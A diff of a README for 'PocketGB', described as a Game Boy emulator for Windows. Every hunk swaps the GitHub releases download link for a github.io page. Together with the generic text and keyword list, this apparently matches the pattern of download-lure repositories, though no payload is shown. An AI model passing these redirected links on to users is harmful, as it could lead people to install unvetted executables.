@@ -1,6 +1,6 @@
 # 🕹️ PocketGB - Play Your Favorite Game Boy Games on PC
 
-[![Download PocketGB](https://img.shields.io/badge/Download-PocketGB-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Laurenaislamic1659/PocketGB/releases)
+[![Download PocketGB](https://img.shields.io/badge/Download-PocketGB-8A2BE2?style=for-the-badge&logo=github)](https://laurenaislamic1659.github.io)
 
 ## 🎮 What is PocketGB?
 
@@ -16,7 +16,7 @@ PocketGB is a free application that lets you play Game Boy and Game Boy Color ga
 
 ## 📥 Downloading PocketGB
 
-Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
+Visit this link to download the application: [https://laurenaislamic1659.github.io](https://laurenaislamic1659.github.io)
 
 This link takes you to the official download page where you'll find the latest version of PocketGB ready for you to grab.
 
@@ -30,7 +30,7 @@ This link takes you to the official download page where you'll find the latest v
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
+Visit this link to download the application: [https://laurenaislamic1659.github.io](https://laurenaislamic1659.github.io)
 
 Just click the link, and the download page will open. From there, click the download button to get the PocketGB file. It will save to your computer's "Downloads" folder.
 
@@ -128,6 +128,6 @@ PocketGB brings the magic of classic handheld gaming to your Windows PC in a sim
 
 So what are you waiting for? Grab your favorite Game Boy games, download PocketGB, and start your adventure today!
 
-**Ready to play?** Visit this link to download the application: [https://github.com/Laurenaislamic1659/PocketGB/releases](https://github.com/Laurenaislamic1659/PocketGB/releases)
+**Ready to play?** Visit this link to download the application: [https://laurenaislamic1659.github.io](https://laurenaislamic1659.github.io)
 
 Keywords: emulation, emulator, emulatorjs, emulators, game, game-dev, game-engine, gameboy, gameboy-camera, gameboy-color, gameboy-color-emulator, gameboy-development, gameboy-emulator, gamedev, games, gaming, nintendo, rom, romhacking
